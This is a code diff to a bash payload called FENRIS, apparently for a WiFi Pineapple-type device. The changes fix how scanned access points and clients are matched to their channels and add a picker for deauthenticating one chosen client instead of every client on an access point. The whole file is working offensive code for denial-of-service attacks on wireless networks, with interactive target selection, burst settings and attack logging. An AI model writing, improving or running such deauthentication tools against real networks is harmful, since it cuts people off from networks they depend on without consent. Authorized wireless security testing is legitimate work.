@@ -13,7 +13,6 @@
 
 # === CONFIGURATION ===
 LOOTDIR="/root/loot/fenris"
-INTERFACE="wlan1mon"
 INPUT=/dev/input/event0
 
 # Deauth settings
@@ -99,33 +98,67 @@ declare -a AP_SSIDS
 declare -a AP_CHANNELS
 declare -a CLIENT_MACS
 declare -a CLIENT_AP_MACS
+declare -a CLIENT_CHANNELS
+declare -a SEL_CLIENTS
+CSELECTED=0
 SELECTED=0
 TOTAL_APS=0
 TOTAL_CLIENTS=0
 
 # === SCAN FUNCTIONS ===
+
+# recon_records: split a PineAP RECON JSON array into one top-level object per line.
+# Brace-depth aware and string-safe, so the nested beacon[]/response[] arrays inside an AP
+# record stay with their own AP. Fields must be read per record: the previous code ran one
+# grep per field over the whole document and paired them by array position, so a single AP
+# with two beacon entries shifted every later SSID *and channel* by one, and FENRIS would
+# then transmit against the wrong BSSID on the wrong channel.
+recon_records() {
+    awk '{
+        n = length($0)
+        for (i = 1; i <= n; i++) {
+            c = substr($0, i, 1)
+            if (instr) {
+                rec = rec c
+                if (esc)            { esc = 0 }
+                else if (c == "\\") { esc = 1 }
+                else if (c == "\"") { instr = 0 }
+                continue
+            }
+            if (c == "\"") { instr = 1; rec = rec c; continue }
+            if (c == "{")  { depth++; rec = rec c; continue }
+            if (c == "}")  { depth--; rec = rec c; if (depth == 0) { print rec; rec = "" }; continue }
+            if (depth > 0) rec = rec c
+        }
+    }'
+}
+
+# json_str <record> <key> -> first string value for that key within this record
+json_str() { printf '%s' "$1" | grep -o "\"$2\":\"[^\"]*\"" | head -1 | sed "s/^\"$2\":\"//; s/\"\$//"; }
+# json_num <record> <key> -> first numeric value for that key within this record
+json_num() { printf '%s' "$1" | grep -o "\"$2\":[0-9]*" | head -1 | sed "s/^\"$2\"://"; }
+
 scan_access_points() {
     LOG "Scanning for access points..."
     led_scanning
 
-    local json=$(_pineap RECON APS limit=30 format=json)
+    local json rec mac ssid ch
+    json=$(_pineap RECON APS limit=30 format=json)
 
     AP_MACS=()
     AP_SSIDS=()
     AP_CHANNELS=()
 
-    while read -r mac; do
-        AP_MACS+=("$mac")
-    done < <(echo "$json" | grep -o '"mac":"[^"]*"' | sed 's/"mac":"//;s/"//')
-
-    while read -r ssid; do
+    while IFS= read -r rec; do
+        mac=$(json_str "$rec" mac)
+        [ -n "$mac" ] || continue
+        ssid=$(json_str "$rec" ssid)
+        ch=$(json_num "$rec" channel)
         [ -z "$ssid" ] && ssid="[Hidden]"
+        AP_MACS+=("$mac")
         AP_SSIDS+=("$ssid")
-    done < <(echo "$json" | grep -o '"ssid":"[^"]*"' | head -30 | sed 's/"ssid":"//;s/"//')
-
-    while read -r ch; do
-        AP_CHANNELS+=("$ch")
-    done < <(echo "$json" | grep -o '"channel":[0-9]*' | head -30 | sed 's/"channel"://')
+        AP_CHANNELS+=("${ch:-0}")
+    done < <(printf '%s' "$json" | recon_records)
 
     TOTAL_APS=${#AP_MACS[@]}
 
@@ -142,18 +175,22 @@ scan_clients() {
     LOG "Scanning for clients..."
     led_scanning
 
-    local json=$(_pineap RECON CLIENTS limit=50 format=json)
+    local json rec mac ap ch
+    json=$(_pineap RECON CLIENTS limit=50 format=json)
 
     CLIENT_MACS=()
     CLIENT_AP_MACS=()
+    CLIENT_CHANNELS=()
 
-    while read -r mac; do
+    while IFS= read -r rec; do
+        mac=$(json_str "$rec" mac)
+        [ -n "$mac" ] || continue
+        ap=$(json_str "$rec" ap_mac)
+        ch=$(json_num "$rec" channel)
         CLIENT_MACS+=("$mac")
-    done < <(echo "$json" | grep -o '"mac":"[^"]*"' | sed 's/"mac":"//;s/"//')
-
-    while read -r ap; do
-        CLIENT_AP_MACS+=("$ap")
-    done < <(echo "$json" | grep -o '"ap_mac":"[^"]*"' | sed 's/"ap_mac":"//;s/"//')
+        CLIENT_AP_MACS+=("${ap:--}")
+        CLIENT_CHANNELS+=("${ch:-0}")
+    done < <(printf '%s' "$json" | recon_records)
 
     TOTAL_CLIENTS=${#CLIENT_MACS[@]}
 
@@ -191,6 +228,52 @@ select_ap_target() {
                 SELECTED=$((SELECTED + 1))
                 [ $SELECTED -ge $TOTAL_APS ] && SELECTED=0
                 show_ap_target
+                ;;
+            A)
+                return 0
+                ;;
+            B|BACK)
+                return 1
+                ;;
+        esac
+    done
+}
+
+# filter_clients_for_ap <bssid> -> SEL_CLIENTS (indices into CLIENT_MACS); rc 1 when none
+filter_clients_for_ap() {
+    local ap="${1,,}" i
+    SEL_CLIENTS=()
+    for i in "${!CLIENT_MACS[@]}"; do
+        [ "${CLIENT_AP_MACS[$i],,}" = "$ap" ] && SEL_CLIENTS+=("$i")
+    done
+    [ ${#SEL_CLIENTS[@]} -gt 0 ]
+}
+
+show_client_target() {
+    local i="${SEL_CLIENTS[$CSELECTED]}"
+    LOG ""
+    LOG "[$((CSELECTED + 1))/${#SEL_CLIENTS[@]}] ${CLIENT_MACS[$i]}"
+    LOG "on ${CLIENT_AP_MACS[$i]}"
+    LOG ""
+    LOG "UP/DOWN=Scroll A=This one B=All clients"
+}
+
+select_client_target() {
+    CSELECTED=0
+    show_client_target
+
+    while true; do
+        local btn=$(WAIT_FOR_INPUT)
+        case "$btn" in
+            UP|LEFT)
+                CSELECTED=$((CSELECTED - 1))
+                [ $CSELECTED -lt 0 ] && CSELECTED=$(( ${#SEL_CLIENTS[@]} - 1 ))
+                show_client_target
+                ;;
+            DOWN|RIGHT)
+                CSELECTED=$((CSELECTED + 1))
+                [ $CSELECTED -ge ${#SEL_CLIENTS[@]} ] && CSELECTED=0
+                show_client_target
                 ;;
             A)
                 return 0
@@ -284,6 +367,22 @@ attack_targeted() {
     LOG "Channel: $target_channel"
     LOG ""
 
+    # Offer one client on this AP. B at the picker falls back to the AP-wide broadcast, which is
+    # what this mode did unconditionally while deauth_single_client sat unreachable.
+    local target_client=""
+    if scan_clients && filter_clients_for_ap "$target_ap"; then
+        LOG "${#SEL_CLIENTS[@]} client(s) on $target_ssid"
+        if select_client_target; then
+            target_client="${CLIENT_MACS[${SEL_CLIENTS[$CSELECTED]}]}"
+            LOG "Target client: $target_client"
+        else
+            LOG "All clients (broadcast)"
+        fi
+    else
+        LOG "No clients listed for this AP"
+        LOG "Broadcast only"
+    fi
+
     # Get burst count
     local burst_count=$(NUMBER_PICKER "Deauth packets per burst" $DEFAULT_BURST_COUNT)
     case $? in
@@ -302,8 +401,9 @@ attack_targeted() {
             ;;
     esac
 
-    # Use broadcast for all clients on this AP
-    local confirm=$(CONFIRMATION_DIALOG "Attack ALL clients on:\n$target_ssid\n\n$burst_count pkts x $num_bursts bursts")
+    local scope="ALL clients on"
+    [ -n "$target_client" ] && scope="${target_client} on"
+    local confirm=$(CONFIRMATION_DIALOG "Attack $scope:\n$target_ssid\n\n$burst_count pkts x $num_bursts bursts")
     case $? in
         $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
             LOG "Cancelled"
@@ -317,7 +417,7 @@ attack_targeted() {
     fi
 
     # Execute attack
-    execute_deauth_storm "$target_ap" "$target_channel" "$burst_count" "$num_bursts" "$target_ssid"
+    execute_deauth_storm "$target_ap" "$target_channel" "$burst_count" "$num_bursts" "$target_ssid" "$target_client"
 }
 
 # Mode 2: Multi-AP storm (all discovered APs)
@@ -440,13 +540,15 @@ attack_storm() {
     ALERT "FENRIS COMPLETE\n\nRounds: $((round - 1))\nDeauth packets: $total_deauths\n\nLog: $logfile"
 }
 
-# Execute single-target deauth
+# Execute a single-AP attack. With a client MAC it is a unicast deauth of that one client via
+# deauth_single_client; without one it is the AP-wide broadcast.
 execute_deauth_storm() {
     local ap_mac=$1
     local channel=$2
     local burst_count=$3
     local num_bursts=$4
     local ssid=$5
+    local client=${6:-}
 
     led_attacking
     play_start
@@ -461,6 +563,7 @@ execute_deauth_storm() {
     logboth "=== FENRIS ATTACK ==="
     logboth "Target: $ssid"
     logboth "AP MAC: $ap_mac"
+    logboth "Client: ${client:-all (broadcast)}"
     logboth "Channel: $channel"
     logboth "Started: $(date)"
     logboth ""
@@ -484,7 +587,8 @@ execute_deauth_storm() {
         logboth "Burst $burst: Sending $burst_count deauths..."
         play_attack
 
-        if deauth_broadcast "$ap_mac" "$channel" "$burst_count"; then
+        if { [ -n "$client" ] && deauth_single_client "$ap_mac" "$client" "$channel" "$burst_count"; } \
+           || { [ -z "$client" ] && deauth_broadcast "$ap_mac" "$channel" "$burst_count"; }; then
             total_deauths=$((total_deauths + burst_count))
             logboth "  Sent: $total_deauths total"
         else
